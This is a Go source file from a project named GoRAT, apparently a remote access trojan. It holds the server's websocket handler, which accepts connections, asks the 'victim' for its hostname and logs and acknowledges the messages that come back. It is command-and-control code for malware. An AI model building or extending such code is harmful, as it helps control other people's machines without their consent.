// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package server

import (
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"

	"github.com/fjah/GoRAT/commands"
	"github.com/gorilla/websocket"
)

// Default options
var upgrader = websocket.Upgrader{}
var c *websocket.Conn

func wsHandler(w http.ResponseWriter, r *http.Request) {
	var err error

	pingLogs := os.Getenv("PING_LOGS")

	// Wait for interrupt
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	// Upgrade the protocol
	c, err = upgrader.Upgrade(w, r, nil)
	chk(err)
	defer c.Close()

	// Request the hostname of the victim
	go c.WriteMessage(websocket.TextMessage, []byte("HOSTNAME"))

	go waitForMode(c)

	go func() {
		for {
			// Get message
			_, message, err := c.ReadMessage()
			if err != nil {
				chksoft(err)
				break
			}

			// Exclusive bidirectional ping cmd
			if strings.HasPrefix(string(message), "PING") {
				res, cmdName := commands.HandleCommand(message)
				if pingLogs == "TRUE" {
					log.Println(cmdName + " " + res)
				}
				continue
			}

			log.Println(c.RemoteAddr(), strings.TrimSpace(string(message)))
			chk(c.WriteMessage(websocket.TextMessage, []byte("ACK "+string(message)))) // TODO: make this more efficient
		}
	}()

	// Clean closure
	<-interrupt
	chk(c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "")))
}
